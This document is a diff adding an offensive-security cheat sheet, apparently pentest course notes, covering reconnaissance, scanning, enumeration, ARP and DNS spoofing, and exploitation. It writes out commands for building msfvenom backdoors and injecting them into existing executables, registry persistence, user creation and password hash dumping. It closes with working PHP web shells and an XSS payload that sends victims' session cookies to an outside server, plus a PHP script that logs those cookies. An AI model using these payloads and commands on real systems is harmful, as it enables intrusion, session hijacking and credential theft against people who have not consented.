@@ -1,0 +1,330 @@
+***************************************************************************
+
+InfoSec cheat sheet
+
+***************************************************************************
+
+
+INFO GATHERING
+
+	- strategic questions
+	- netcraft
+	- google
+
+	- nmap
+
+		Ping host and save the ones alive in a file:
+		nmap -sn 172.16.5.* -oG - | awk '/Up/{print $2}' > alive.txt && cat alive.txt
+
+	- nslookup
+
+		From name to IP:
+		nslookup [domain name]
+
+		From IP to name:
+		nslookup [ip address]
+
+		Specify DNS to query:
+		nslookup [ip address] [DNS ip address]
+
+		More info:
+		https://www.computerhope.com/unix/unslooku.htm
+
+	- dig
+
+		From name to IP:
+		dig +short [domain name] 
+
+		From IP to name:
+		dig -x [ip address]
+
+		Zone transfer:
+		dig axfr @[DNS ip address] [domain name] 
+
+	- host
+
+		From name to IP:
+		host [domain name]
+
+		From IP to name:
+		host [ip address]
+
+		Zone transfer:
+		host -t axfr [domain name] [DNS ip address]
+
+		More info:
+		https://www.tecmint.com/linux-host-command-examples-for-querying-dns-lookups/
+
+	- netdiscover
+
+		netdiscover -i [interface] -r [subnet]
+
+	- host discovery:
+
+		Find ip bruteforcing names:
+		for name in $(cat /usr/share/fierce/hosts.txt);do host $name.domain.name [DNS server ip address] -W 2; done | grep "has address"
+
+		Find domain names from an IP range:
+		for number in {1..99}; do nslookup IP.ADDRESS.$number [DNS server]; done | grep "name ="
+
+PORT SCANNING
+
+	- nmap
+
+		Check zombie for idle scan:
+		nmap -O -v -n [ip address]
+
+	- hping3
+
+		Syn scan:
+		hping3 -S [ip address] -p [port] -c [packets to send]
+
+		Syn scan port range:
+		hping3 -S [ip address] --scan 1-1000 -c [packets to send]
+		OR
+		hping3 -S [ip address] --scan 21,22,53 -c [packets to send]
+
+		UDP scan:
+		hping3 -2 [ip address] --scan 1-1000 -c [packets to send]
+
+		XMAS scan:
+		hping3 -F -P -U [ip address] --scan 21,22,53 -c [packets to send]
+
+		Check zombie for idle scan:
+		hping3 -S -r [ip address] -p [port]
+
+		Idle scan:
+		hping3 -a [zombie address] -S -p [target address] (if increments by +2 port is open)
+
+ENUMERATION
+
+	- nmblookup (linux)
+
+		Netbios name table (The <20> identifier signifies that the host has file shares enabled):
+		nmblookup -A [ip address] 
+
+	- nbtstat (windows)
+
+		Netbios name table (The <20> identifier signifies that the host has file shares enabled):
+		nbtstat -a [ip address]
+
+	- smbclient (linux)
+
+		Try null session:
+		smbclient -L [ip address]
+
+	- net use (windows):
+
+		Null session:
+		net use \\[ip address]\[share$] "" /u:""
+
+	- nmap scripts
+
+		Smb users enum:
+		nmap --script=smb-enum-users -p [port] [ip address] --script-args smbuser=[user],smbpass=[psw]
+
+	- onesixtyone
+
+		Bruteforce community name:
+		onesixtyone -c /usr/share/doc/onesixtyone/dict.txt [ip address]
+
+	- snmp-check
+
+		Check if SNMP is really running:
+		snmp-check -t [ip address]
+
+	- snmpenum
+
+		Getting info (the file.txt depends on the target. Consider dos2unix *.txt for some targets):
+		perl snmpenum.pl [ip address] [community string] [file.txt]
+
+	- snmpwalk
+
+		Enumerate entire MIB tree:
+		snmpwalk -c [community string] -v1 [ip address]
+
+		Enumerate users,processes ecc:
+		snmpwalk –c [community string] –v1 [ip address] [corrispondent OID]
+
+VULNERABILITY ASSESSMENT
+
+	- nessus
+
+		Before start:
+		/etc/init.d/nessusd start
+
+		Ready:
+		https://kali:8834/
+
+	- openvas
+
+POISONING AND SNIFFING
+
+	- wireshark
+	- arpspoof
+
+		Activate packet forwarding:
+		echo 1 > /proc/sys/net/ipv4/ip_forward
+
+		Spoofing (on two different terminal tabs):
+    	arpspoof -i tap0 -t [first target] -r [second target]
+    	arpspoof -i tap0 -t [second target] -r [first target]
+
+	- drifnet
+
+		Sniff images while sniffing
+    	driftnet -i tap0 -b
+
+	- dnsspoof
+
+		Create a host file [my IP address] *.sportsfoo.com (i know the victim is going to visit a *.sportsfoo.com sub domain)
+    	dnsspoof -i tap0 -f host.txt
+
+EXPLOITATION
+
+	- metasploit
+
+		Before start:
+		systemctl start postgresql
+
+		Load nessus:
+			nessus_connect [user]:[psw]@localhost
+			nessus_scan_list
+        	nessus_report_hosts [id scan]
+        	nessus_db_import [id scan]
+       		vulns
+
+	- exploitDB
+
+	- msfvenom
+
+		Create backdoor:
+		msfvenom -p [payload] LHOST=[ip address] LPORT=[port] --platform [platform] -f [format, usually exe] > backdoor.exe
+
+		Insert payload into existing exe:
+		msfvenom -p [payload] LHOST=[ip address] LPORT=[port] -f exe -e x86/shikata_ga_nai -i 15 -k -x file.exe > backdoor.exe
+
+POST EXPLOITATION
+
+	- routing metasploit
+
+		Add route:
+		route add [subnet] [meterpreter session]
+
+ 	- proxychains + socks4a
+
+ 		Add 'proxychains' in front of the command.
+ 		Search for 'socks4a' in msf and run it
+
+	- rdp
+
+		Start remote desktop:
+		rdesktop [ip address] -u [user] -p [psw]
+
+		Enable RDP:
+		meterpreter> run post/windows/manage/enable_rdp
+		OR
+		meterpreter> run getgui -e -u [user] -p [password]
+
+		Give user permission to use RDP:
+		C:> net localgroup "Remote Desktop Users" [username] /add
+
+	- mantain access
+
+		Automatic:
+		meterpreter> run persistence
+
+		Manually:
+		meterpreter> reg setval -k HKLM\\software\\microsoft\\windows\\currentversion\\run -d "C:\path\to\backdoor.exe" -v backdoor_name
+
+	- portforward:
+
+			Add a portfwd:
+			meterpreter> portfwd add -L 127.0.0.1 -l [local port] -p [remote port] -r [IP address]
+
+	- CMD users ops
+
+		List user in localgroup:
+		net localgroup groupName
+
+		Find the list of all groups a user is member of:
+		net user userName
+
+		Add a new user account on the local computer:
+		net user username password /ADD
+
+		Add a new user account to the domain:
+		net user username password /ADD /DOMAIN
+
+	- CMD services ops
+
+	 	Get services:
+	 	wmic service list brief > service.txt
+
+	 	Get running services:
+	 	wmic service where started=true > service.txt
+
+	 	Find services autostarting, privileges NT AUTHORITY:
+		wmic service WHERE StartMode="Auto" get Name,StartName,PathName | findstr -i "NT AUTHORITY" > service.txt
+
+	 - CMD directory ops
+
+	 	Verify privileges:
+	 	icacls C:\path\to\verify\
+
+	- hashdump
+
+		Get hashdump:
+		meterpreter> run hashdump
+
+
+WEB APPLICATIONS
+
+	- beef
+
+		Before start:
+		cd /etc/beef-xss/
+		nano config.yaml
+
+		Start:
+		cd /usr/share/beef-xss/
+		./beef
+
+	- misc
+
+	Upload backdoor (PHP):
+	<?php
+		if(isset($_POST['submit'])) {
+
+			$file_tmp = $_FILES['file']['tmp_name'];
+			$file = $_FILES['file']['name'];
+
+			if (move_uploaded_file($file_tmp, $file)) {
+				$r = shell_exec($file);
+				echo $r;
+			}
+		}	
+	?>
+
+	Simple shell exec (PHP):
+	<?php
+		# you may use '&' instead of '?' to pass $_GET params
+		$cmd = $_GET['c'];
+		$res = shell_exec($cmd);
+		echo '<pre>' . $res . '</pre>';
+	?>
+
+	XSS (read session cookie and send it to my server):
+	// caution: include this code between <script> </script> tags
+	var i = new Image()
+	i.src = "http://www.esempio.it/q="+document.cookie
+
+	XSS (intercept a session cookie and write it to file):
+	<?php
+		if(isset($_GET['q']) && $_GET['q']) {
+			$jar = $_GET['q'];
+			$file = fopen('file.txt', 'a');
+			fwrite($file, $jar);
+			fclose($file);
+		}
+	?>
